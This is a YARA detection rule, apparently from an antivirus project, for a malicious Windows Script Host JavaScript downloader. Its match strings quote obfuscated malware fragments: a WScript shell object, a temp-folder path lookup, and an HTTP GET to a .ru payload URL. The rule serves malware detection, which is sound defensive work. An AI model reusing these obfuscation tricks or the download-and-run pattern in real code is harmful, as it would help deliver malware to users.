rule sig_20160428_9f7c740335ccdfe2a8af0b424541f0ea {
  meta:
    description = "datamaliciousorder - file 20160428_9f7c740335ccdfe2a8af0b424541f0ea.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6459ca8a3d078916c92015873008de80bf0b49125ce0fa9f2548819939f30c8f"

  strings:
    $s1  = "function XjhAobYvbCexVthHukGek(LetGmlEdkLeeKkmElvEgq){ExeZioAszHrnJtpSkoSfx[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function XjhAobYvbCexVthHukGek(LetGmlEdkLeeKkmElvEgq){ExeZioAszHrnJtpSkoSfx[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function SdyEyvDvsHzzLuiIeyMuh() {return ExeZioAszHrnJtpSkoSfx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "return TogFnjBptZucQbzVmeNpt - BvdNqrFpyGbqVbfFddSll;};" fullword ascii
    $s5  = "function MmaKcqXvfYafUzwHhlEab(TogFnjBptZucQbzVmeNpt, BvdNqrFpyGbqVbfFddSll){GtpMxlMdcIteOkgDxaMmu = GtpMxlMdcIteOkgDxaMmu * 1; " ascii
    $s6  = "var ExeZioAszHrnJtpSkoSfx = function JunLgbDttZyvJwfQuqRxc() {return ZqtCciMjsYryOciSdoSir[BwhIftAbvOzsDlqLwfKob](\"WScript\"+\"" ascii
    $s7  = "NirBjnDrhCtxXdqVvoEjs[WjoUxdYueWmdHqlMbcVcz](\"G\" + \"ET\", \"http://sarsudexpert.ru/q2ikcxz\", false);" fullword ascii
    $s8  = "var ZqtCciMjsYryOciSdoSir = this[\"WScript\"];" fullword ascii
    $s9  = "var ExeZioAszHrnJtpSkoSfx = function JunLgbDttZyvJwfQuqRxc() {return ZqtCciMjsYryOciSdoSir[BwhIftAbvOzsDlqLwfKob](\"WScript\"+\"" ascii
    $s10 = "function SdyEyvDvsHzzLuiIeyMuh() {return ExeZioAszHrnJtpSkoSfx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function LzwAhmOttLmhUjeDboOii(){return DizWvaMzyVjuTimTjxMvt + \"\";};" fullword ascii
    $s12 = "function MmaKcqXvfYafUzwHhlEab(TogFnjBptZucQbzVmeNpt, BvdNqrFpyGbqVbfFddSll){GtpMxlMdcIteOkgDxaMmu = GtpMxlMdcIteOkgDxaMmu * 1; " ascii
    $s13 = "if (NirBjnDrhCtxXdqVvoEjs[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function DumKfxFkiTsmUywRclYvq() {return ((SlkJoeCmyGzoQswDmnFem == true) && (SlkJoeCmyGzoQswDmnFem == OxqCycRcmOtjVaeRatRnt)) ?" ascii
    $s15 = "function DumKfxFkiTsmUywRclYvq() {return ((SlkJoeCmyGzoQswDmnFem == true) && (SlkJoeCmyGzoQswDmnFem == OxqCycRcmOtjVaeRatRnt)) ?" ascii
    $s16 = "var RubYwgXpzAncEqmEjnRgh = false;" fullword ascii
    $s17 = "RubYwgXpzAncEqmEjnRgh = true;" fullword ascii
    $s18 = "function BqqSswFsrKzkSorOftMsl(OcoPetErdHnhMfoIisWcj) {var FsvZdwNdyIiuRbqXykOlx = (1, 2, 3, 4, 5, OcoPetErdHnhMfoIisWcj); retur" ascii
    $s19 = "SlkJoeCmyGzoQswDmnFem = true; " fullword ascii
    $s20 = "function EtlLmzEbxXtxPxdPksJit()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}